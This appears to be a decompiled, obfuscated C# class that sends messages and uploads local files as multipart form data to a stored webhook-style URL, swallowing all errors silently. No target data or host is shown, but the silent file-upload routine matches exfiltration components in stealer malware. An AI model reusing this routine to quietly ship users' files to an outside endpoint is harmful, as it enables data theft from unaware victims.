using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

internal sealed class Class10
{
	public static string string_0 = Class13.string_0;

	public static string string_1 = Class13.string_1;

	private HttpClient httpClient_0;

	private string string_2;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[CompilerGenerated]
	private string string_3;

	public string _name
	{
		[CompilerGenerated]
		get
		{
			return string_3;
		}
		[CompilerGenerated]
		set
		{
			string_3 = value;
		}
	}

	public Class10(string string_4)
	{
		httpClient_0 = new HttpClient();
		string_2 = string_4;
	}

	public bool method_0(string string_4, string string_5, string string_6)
	{
		bool result2 = default(bool);
		try
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(string_4), "content");
			if (string_6 != null)
			{
				byte[] content = File.ReadAllBytes(string_6);
				multipartFormDataContent.Add(new ByteArrayContent(content), string_6, string_5);
			}
			HttpResponseMessage result = httpClient_0.PostAsync(string_2, multipartFormDataContent).Result;
			result2 = result.StatusCode == HttpStatusCode.NoContent;
			return result2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result2;
		}
	}

	public bool method_1(string string_4)
	{
		bool result2 = default(bool);
		try
		{
			MultipartFormDataContent multipartFormDataContent = new MultipartFormDataContent();
			multipartFormDataContent.Add(new StringContent(_name), "username");
			multipartFormDataContent.Add(new StringContent(string_4), "content");
			HttpResponseMessage result = httpClient_0.PostAsync(string_2, multipartFormDataContent).Result;
			result2 = result.StatusCode == HttpStatusCode.NoContent;
			return result2;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result2;
		}
	}
}
